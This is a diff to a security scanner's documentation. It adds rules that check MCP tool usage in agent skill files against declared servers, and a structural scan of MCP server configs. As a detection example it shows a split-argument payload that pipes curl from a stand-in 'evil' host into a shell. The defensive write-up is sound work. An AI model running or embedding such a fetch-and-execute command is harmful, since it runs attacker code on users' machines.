@@ -126,6 +126,19 @@ Scans the **content** of in-repo scripts (`scripts/<name>.{py,sh,ps1}`) that an 
 
 > **SCR001 is a deliberately LOW-RECALL heuristic.** It raises an attacker's cost — it is **not** a guarantee. A clean SCR001 result does **not** mean the script is safe: obfuscated reads, indirect sinks, and data-flow it cannot see all evade it. Treat absence of an SCR001 finding as "no cheap signal found," never as proof of safety; always manually review referenced scripts. The dangerous (SCR002) pass runs first, and an `curl|sh`-style line it already reports is **not** double-reported as SCR001.
 
+### MCP consistency rules (`MCP*`)
+
+Cross-checks MCP tool usage against declared servers, and structurally scans MCP server commands. An `mcp__<server>__<tool>` token in a skill body is "usage"; `metainfo.requires.mcp` (a list of server names) plus the org `allowlists.mcp_servers` are "declaration".
+
+**False-positive control (MCP001 is high/floor):** an `mcp__...` token is **not** counted as usage when it sits inside a fenced code block (` ``` `), an inline-code span (`` ` ``), or on a detection-context line (a line containing `detect`/`scan`/`pattern`/`denylist`/`allowlist`/…). Adopters routinely document MCP tool names in examples and denylists — those must not block a merge.
+
+| Rule | Severity | Detects | Why it matters |
+|---|---|---|---|
+| MCP001 | high | An `mcp__<server>__` tool used in a skill body whose `<server>` is in neither `metainfo.requires.mcp` nor the org `allowlists.mcp_servers` | An undeclared MCP dependency cannot be provisioned, reviewed, or gated; declaring it makes the dependency explicit |
+| MCP002 | low | A server listed in `metainfo.requires.mcp` that is never used (`mcp__<server>__`) in the body | A stale declaration misleads reviewers; remove it or add the usage. Org-allowlist servers are exempt — an unused org-allowlisted server is intentional infra |
+
+**MCP server command structural scan (`mcp-config` assets).** For `.mcp.json` / `mcp.json`, the raw-JSON-text scan (SEC010/SEC011 via `scan_security`) can miss a payload split across `args` elements — e.g. `"args":["-c","curl http://evil | sh"]` — because the pipe is not adjacent to `curl` in the serialized JSON. An additional structural pass reconstructs `command + " " + " ".join(args)` per server in `mcpServers` (or top-level `servers`) and runs the dangerous-pattern baseline on the joined string, emitting **SEC010** on a match. Malformed JSON is tolerated (no finding, no crash).
+
 ### Suppression-visibility rules (`IGNORE*`)
 
 The engine supports two finding-suppression mechanisms, both fail-safe — a broken
